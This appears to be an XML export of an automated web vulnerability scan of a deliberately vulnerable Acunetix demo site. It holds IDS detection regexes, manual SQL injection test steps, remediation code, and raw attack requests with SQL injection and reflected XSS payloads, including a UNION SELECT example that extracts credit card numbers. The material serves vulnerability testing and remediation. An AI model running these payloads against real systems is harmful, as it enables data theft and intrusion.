SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection><ReportSection><Name>Description</Name><SectionText><![CDATA[Fundamentally, SQL injection is an attack upon the Web application, not the Web server or the OS itself. A SQL injection attack, as the name implies, is the act of adding an unexpected SQL command to a query, thereby manipulating the database in ways unintended by the database administrator or developer. SQL injection vulnerabilities are often present in Web-based forms or query strings within a URL. For example, think of a user login form. If the user input from the form is directly used to build a dynamic SQL statement, then there has been no input validation conducted, giving control to a potential attacker who may want access to the database. Basically, an attacker can use an input box to send his own request to the server, and then use the results in nefarious ways. <br /><br />
In the following URL example, the text in bold might be supplied by the client in an HTTP GET or POST parameter: <br /><br />
http://www.server.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />
In this example, the client-supplied value, 12345, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of. The Web application takes this value and inserts it into the SQL statement between the single quotes in the WHERE clause. However, consider the following URL: <br /><br />
http://www.server.com/GetItemPrice?ItemPrice?ItemNumber=<b>0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1</b><br /><br />
This would cause the Web application to produce the following SQL statement: <br /><br />
SELECT Price FROM Products WHERE ItemNumber = <b>'0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1';</b><br /><br />
In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of the user’s choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number. SQL injection can be avoided by using secure programming techniques which prevent client-supplied values from interfering with SQL statement syntax.]]></SectionText></ReportSection><ReportSection><Name>Impact Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Impact Description</Name><SectionText><![CDATA[The results of a successful SQL injection attack can vary greatly depending upon the environment and configuration in which it occurs. For instance, if the database connection utilizes the security context of the database owner (dbo), a successful exploitation would give an attacker the means to modify table contents, create new tables, etc. If the default account SA is utilized, successful exploitation of a SQL Injection vulnerability could lead to an attacker gaining complete control over the SQL server, or even (by creating user accounts) to taking control of the Windows server that houses the database itself.]]></SectionText></ReportSection><ReportSection><Name>Probability Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Probability Description</Name><SectionText><![CDATA[SQL Injection is easy to test for, often involving something as simple as submitting a single quotation mark to see if the SQL statement can be closed, and subsequently another statement added to it. Once found, SQL Injection vulnerabilities are also relatively easy to exploit.  There are a plethora of automated hacking tools that can dramatically increase the effectiveness of this attack, and information on conducting manual attacks is widespread.]]></SectionText></ReportSection><ReportSection><Name>Risk Score</Name><SectionText><![CDATA[Critical]]></SectionText></ReportSection><ReportSection><Name>Risk Description</Name><SectionText><![CDATA[This vulnerability should be addressed immediately.]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[SQL injection is caused by programming techniques that allow client-supplied values to interfere and modify SQL statement syntax. Thus, the best solution is to design and program web applications in a manner that prevents client-supplied values from being treated as SQL syntax. The following recommendations can be used as a basis for that. 
<ul><li>Stringently define the data type (for instance, a string, an alphanumeric character, etc) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be utilized in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, let that field accept only numbers. </li><li>Define the maximum and minimum data lengths for what the application will accept. </li><li>Specify acceptable numeric ranges for input.</li></ul>

Strict input validation can avoid most SQL injection attacks. Be sure to reject any data that does not match the expected format. This can be done with Validation controls or directly in your code. The most important aspect of avoiding SQL injection attacks is to always parameterize your queries to the database. This prevents user-supplied data from changing the syntax of the query.<br /><br />
In the code fragment below, a product ID is obtained from the HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />
C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString))<br />
        {<br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn);<br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50);<br />
            prm.Value = Request.QueryString["pid"];<br />
            cmd.Parameters.Add(prm);<br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        }<br /><br />


VB.NET sample:<br /><br />
        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString)<br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)<br />

            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50)<br />
            prm.Value = Request.QueryString("pid")<br />
            cmd.Parameters.Add(prm)<br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br />

It is still useful and recommended to validate the contents of any input. But by using parameterized queries, even ridiculously incorrect inputs have no opportunity to alter the meaning of your SQL queries.]]></SectionText></ReportSection><ReportSection><Name>References</Name><SectionText><![CDATA[<br /><b>SPI Dynamics Blind SQL Injection Whitepaper</b><br /><a href="http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf">http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf</a>]]></SectionText></ReportSection><ReportSection><Name>Fix Description</Name><SectionText><![CDATA[<br />
SQL injection is caused by programming techniques that allow client-supplied values to interfere and modify SQL statement syntax. Thus, the best solution is to design and program Web applications in a manner that prevents client-supplied values from being treated as SQL syntax. The following recommendations can be used as a basis for that.
<ul><li>Stringently define the data type (a string, an alphanumeric character, etc.) that the application will accept. </li><li>Use what is good instead of what is bad. </li><li>Validate input for improper characters. </li><li>Do not display error messages to the end user that provide information (such as table names) that could be used in orchestrating an attack. </li><li>Define the allowed set of characters. For instance, if a field is to receive a number, allow that field to accept only numbers. </li><li>Define the maximum and minimum data lengths that the application will accept. </li><li>Specify acceptable numeric ranges for input. </li></ul>
Strict input validation can avoid most SQL injection attacks. Be sure to reject any data that does not match the expected format. This can be done with validation controls or directly in your code. The most important aspect of avoiding SQL injection attacks is to always use prepared statements to query the database. This prevents user-supplied data from changing the syntax of the query. Thus, prepared statements help increase security by separating SQL logic from the data being supplied. <br /><br />
In the code sample below, an OrderID is obtained from the HTTP query string, and then used in a SQL query. Note how the string containing the “SELECT” statement passed to preparedStmt is simply a static string, and is not concatenated from input. Also note how the input parameter OrderID is passed, using a setString method, to replace the place holder ‘?’ that is used within the SQL query. <br /><br />
Connection con = DriverManager.getConnection(url, "user", "pass");
int OrderID; <br /><br />
// PreparedStatement precompiles a SQL statement expecting only arguments, preventing injection of SQL keywords. <br /><br />
PreparedStatement preparedStmt = con.prepareStatement( "SELECT * FROM Orders WHERE orderid = ?" ); <br /><br />
preparedStmt.setString( 1, OrderID ); <br /><br />
ResultSet rs = preparedStmt.executeQuery();]]></SectionText></ReportSection></Issue></Issues><RawRequest id="07E70F2EF69EB36DD14CC2E621A697A3"><![CDATA[GET /listproducts.php?artist=3%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09 HTTP/1.1
Referer: http://php.vulnweb.com/artists.php?artist=3
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="07E70F2EF69EB36DD14CC2E621A697A3";PSID="389A9B1071787426A324931DF5CCE7B7";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="3";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="3%2509and%2509(select%2509count(*)%2509from%2509spitable)%2509%253d%25091%2509or%25091%253d0%2509";AttackStringProps="Attack";tid="40";tt="40";
X-RequestManager-Memo: sid="29";smi="0";sc="1";ID="76a29c51";
X-Request-Memo: ID="8c9332ef";sc="1";tid="40";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:48:18 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/html; charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 4866

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: Table 'acuart.spitable' doesn't exist
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></RawResponse><Request id="07E70F2EF69EB36DD14CC2E621A697A3"><Method>GET</Method><Path>/</Path><File>listproducts</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>artist=3%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>artist</Name><Value>3%09and%09(select%09count(*)%09from%09spitable)%09%3d%091%09or%091%3d0%09</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/artists.php?artist=3</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="07E70F2EF69EB36DD14CC2E621A697A3";PSID="389A9B1071787426A324931DF5CCE7B7";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="3";AttackParamDesc="artist";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="3%2509and%2509(select%2509count(*)%2509from%2509spitable)%2509%253d%25091%2509or%25091%253d0%2509";AttackStringProps="Attack";tid="40";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="29";smi="0";sc="1";ID="76a29c51";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="8c9332ef";sc="1";tid="40";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
"http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/main_dynamic_template.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-2">

<!-- InstanceBeginEditable name="document_title_rgn" -->
<title>pictures</title>
<!-- InstanceEndEditable -->
<link rel="stylesheet" href="style.css" type="text/css">
<!-- InstanceBeginEditable name="headers_rgn" -->
<!-- InstanceEndEditable -->
<script language="JavaScript" type="text/JavaScript">
<!--
function MM_reloadPage(init) {  //reloads the window if Nav4 resized
  if (init==true) with (navigator) {if ((appName=="Netscape")&&(parseInt(appVersion)==4)) {
    document.MM_pgW=innerWidth; document.MM_pgH=innerHeight; onresize=MM_reloadPage; }}
  else if (innerWidth!=document.MM_pgW || innerHeight!=document.MM_pgH) location.reload();
}
MM_reloadPage(true);
//-->
</script>

</head>
<body> 
<div id="mainLayer" style="position:absolute; width:700px; z-index:1">
<div id="masthead"> 
  <h1 id="siteName"><a href="https://www.acunetix.com/"><img src="images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></h1>   
  <h6 id="siteInfo">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></h6>
  <div id="globalNav"> 
      	<table border="0" cellpadding="0" cellspacing="0" width="100%"><tr>
	<td align="left">
		<a href="index.php">home</a> | <a href="categories.php">categories</a> | <a href="artists.php">artists
		</a> | <a href="disclaimer.php">disclaimer</a> | <a href="cart.php">your cart</a> | 
		<a href="guestbook.php">guestbook</a> | 
		<a href="AJAX/index.php">AJAX Demo</a>
	</td>
	<td align="right">
		</td>
	</tr></table>
  </div> 
</div> 
<!-- end masthead --> 

<!-- begin content -->
<!-- InstanceBeginEditable name="content_rgn" -->
<div id="content">
	Error: Table 'acuart.spitable' doesn't exist
Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in /hj/var/www/listproducts.php on line 74
</div>
<!-- InstanceEndEditable -->
<!--end content -->

<div id="navBar"> 
  <div id="search"> 
    <form action="search.php?test=query" method="post"> 
      <label>search art</label> 
      <input name="searchFor" type="text" size="10"> 
      <input name="goButton" type="submit" value="go"> 
    </form> 
  </div> 
  <div id="sectionLinks"> 
    <ul> 
      <li><a href="categories.php">Browse categories</a></li> 
      <li><a href="artists.php">Browse artists</a></li> 
      <li><a href="cart.php">Your cart</a></li> 
      <li><a href="login.php">Signup</a></li>
	  <li><a href="userinfo.php">Your profile</a></li>
	  <li><a href="guestbook.php">Our guestbook</a></li>
		<li><a href="AJAX/index.php">AJAX Demo</a></li>
	  </li> 
    </ul> 
  </div> 
  <div class="relatedLinks"> 
    <h3>Links</h3> 
    <ul> 
      <li><a href="http://www.acunetix.com">Security art</a></li> 
	  <li><a href="https://www.acunetix.com/vulnerability-scanner/php-security-scanner/">PHP scanner</a></li>
	  <li><a href="https://www.acunetix.com/blog/articles/prevent-sql-injection-vulnerabilities-in-php-applications/">PHP vuln help</a></li>
	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:48:18 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4866</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="0A3D0E908BB3E03D782B3122BF905B16"><URL>http://php.vulnweb.com:80/listproducts.php?cat=%3csCrIpT%3ealert(27728)%3c%2fsCrIpT%3e</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>cat</AttackParamDescriptor><Issues><Issue id="71941f5a-96d2-42dc-968d-83e69dac9688"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5105</EngineType><AttackHTTPRequest><![CDATA[GET /listproducts.php?cat=%3csCrIpT%3ealert(27728)%3c%2fsCrIpT%3e HTTP/1.1
Referer: http://php.vulnweb.com/categories.php
Accept: */*
Pragma: no-cache
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Host: php.vulnweb.com
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="0A3D0E908BB3E03D782B3122BF905B16";PSID="F7D951246A36A7EA95380E5645528F36";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="1354e211-9d7d-4cc1-80e6-4de3fd128002";AttackSequence="29";AttackParamDesc="cat";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5105";Engine="Cross+Site+Scripting";SmartMode="4";AttackString="%253c%2573%2543%2572%2549%2570%2554%253e%2561%256c%2565%2572%2574%2528%2532%2537%2537%2532%2538%2529%253c%252f%2573%2543%2572%2549%2570%2554%253e";AttackStringProps="Attack";tid="43";tt="40";
X-RequestManager-Memo: sid="35";smi="0";sc="1";ID="b9016a87";
X-Request-Memo: ID="7646835d";sc="1";tid="43";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>5649</VulnerabilityID><Severity>4</Severity><Name>Cross-Site Scripting</Name><Classifications><Classification kind="CWE" identifier="CWE-80" href="http://cwe.mitre.org/data/definitions/80.html">CWE-80: Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="Cross-Site Scripting: Reflected" href="https://vulncat.fortify.com/">Cross-Site Scripting: Reflected</Classification></Classifications><DetectionSelection><Location offset="2411" length="29" /></DetectionSelection><ReportSection><Name>Summary</Name><SectionText><![CDATA[<drc_fortify /><hp-img src="xss.rgc" /><br /><drc_xssrf />A Cross-Site Scripting (XSS) vulnerability was detected in the web application. Cross-Site Scripting occurs when dynamically generated web pages display user input, such as login information, that is not properly validated, allowing an attacker to embed malicious scripts into the generated page and then execute the script on the machine of any user that views the site. In this instance, the web application was vulnerable to an automatic payload, meaning the user simply has to visit a page to make the malicious scripts execute. If successful, Cross-Site Scripting vulnerabilities can be exploited to manipulate or steal cookies, create requests that can be mistaken for those of a valid user, compromise confidential information, or execute malicious code on end user systems. Recommendations include implementing secure programming techniques that ensure proper filtration of user-supplied data, and encoding all user supplied data to prevent inserted scripts being sent to end users in a format that can be executed.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />
Cross-Site Scripting(XSS) happens when user input from a web client is immediately included via server-side scripts in a dynamically generated web page. Reflected XSS is specifically considered critical when malicious payload can be embedded in a URL (e.g. in query strings of GET requests). An attacker can trick a victim, via phishing attack, to click on a link with vulnerable input which has been altered to include attack code and then sent to the legitimate server. The injected code is then reflected back to the user's browser which executes it. <br /><br />

The implications of successful Cross-Site Scripting attacks are:

<ul><li>Account hijacking -  An attacker can hijack the user's session before the session cookie expires and take actions with the privileges of the user who accessed the URL, such as issuing database queries and viewing the results. </li><li>Malicious script execution - Users can unknowingly execute JavaScript, VBScript, ActiveX, HTML, or even Flash content that has been inserted into a dynamically generated page by an attacker. 

</li><li>Worm propagation - With Ajax applications, XSS can propagate somewhat like a virus. The XSS payload can autonomously inject itself into pages, and easily re-inject the same host with more XSS, all of which can be done with no hard refresh. Thus, XSS can send multiple requests using complex HTTP methods to propagate itself invisibly to the user.
